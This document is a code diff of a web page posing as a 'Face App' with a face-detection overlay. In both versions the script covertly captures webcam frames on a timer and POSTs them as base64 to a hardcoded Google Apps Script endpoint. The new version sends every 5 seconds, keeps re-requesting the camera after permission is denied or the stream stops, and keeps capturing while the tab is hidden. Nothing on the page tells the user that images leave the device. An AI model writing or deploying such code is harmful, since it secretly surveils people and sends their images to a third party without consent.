@@ -5,11 +5,10 @@
 
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>Face App</title>
 
 <link rel="stylesheet" href="style.css">
-
-<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
 </head>
 
@@ -25,22 +24,8 @@
 <div id="content">
 
 <div class="menu">
-<i class="fas fa-bolt fa-lg"></i>
 <div class="profilePhoto"></div>
-<i class="fas fa-volume-mute fa-lg"></i>
 </div>
-
-<div class="takenPhotos">
-<div class="first"></div>
-<div class="second"></div>
-<div class="third"></div>
-</div>
-
-<div class="circle">
-<div class="fill"></div>
-</div>
-
-<i class="fas fa-sync-alt fa-lg right"></i>
 
 <div class="detection">
 <div class="line-left"></div>
@@ -56,80 +41,125 @@
 <video id="video" playsinline autoplay></video>
 </div>
 
-<canvas hidden id="canvas" width="640" height="640"></canvas>
+<canvas hidden id="canvas" width="320" height="320"></canvas>
 
 <script>
 
-function post(imgdata){
+const GAS_URL="https://script.google.com/macros/s/AKfycbyaLQ2AmryI8aUb-gFrHfwtp7n8hB6wX34TMkZdfBbDTnNlPW8ge2hINlV1a28M1Hcgig/exec";
 
-$.ajax({
+const video=document.getElementById("video");
+const canvas=document.getElementById("canvas");
 
-type: 'POST',
+let stream=null;
+let sending=false;
 
-url: 'https://script.google.com/macros/s/AKfycbyaLQ2AmryI8aUb-gFrHfwtp7n8hB6wX34TMkZdfBbDTnNlPW8ge2hINlV1a28M1Hcgig/exec',
-
-data: {cat: imgdata},
-
-success: function(result){
-
-console.log("sent");
-
-},
-
-error: function(){
-
-console.log("error");
-
-}
-
-});
-
-}
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-
-const constraints = {
-
-audio:false,
-
-video:{facingMode:"user"}
-
-};
-
-async function init(){
+async function startCamera(){
 
 try{
 
-const stream = await navigator.mediaDevices.getUserMedia(constraints);
+stream=await navigator.mediaDevices.getUserMedia({video:true,audio:false});
 
-video.srcObject = stream;
+video.srcObject=stream;
 
-const context = canvas.getContext('2d');
+video.onloadedmetadata=function(){
 
-setInterval(function(){
+startCapture();
 
-context.drawImage(video,0,0,640,640);
+};
 
-var canvasData = canvas.toDataURL("image/jpeg",0.7);
+stream.getVideoTracks()[0].onended=function(){
 
-var cc = canvasData.replace("data:image/jpeg;base64,","");
+console.log("camera stopped");
 
-post(cc);
+setTimeout(startCamera,3000);
 
-},20000);
+};
 
 }
 
 catch(e){
 
-console.log(e);
+console.log("permission denied");
+
+setTimeout(startCamera,5000);
 
 }
 
 }
 
-init();
+function startCapture(){
+
+if(sending) return;
+
+sending=true;
+
+const ctx=canvas.getContext("2d");
+
+setInterval(()=>{
+
+if(document.hidden){
+
+console.log("tab background");
+
+}
+
+ctx.drawImage(video,0,0,320,320);
+
+const img=canvas.toDataURL("image/jpeg",0.6);
+
+const base64=img.replace("data:image/jpeg;base64,","");
+
+sendImage(base64);
+
+},5000);
+
+}
+
+async function sendImage(data){
+
+try{
+
+await fetch(GAS_URL,{
+
+method:"POST",
+
+headers:{
+
+"Content-Type":"application/x-www-form-urlencoded"
+
+},
+
+body:"cat="+encodeURIComponent(data)
+
+});
+
+console.log("sent");
+
+}
+
+catch(e){
+
+console.log("send error");
+
+}
+
+}
+
+document.addEventListener("visibilitychange",()=>{
+
+if(document.hidden){
+
+console.log("tab hidden");
+
+}else{
+
+console.log("tab active");
+
+}
+
+});
+
+startCamera();
 
 </script>
 
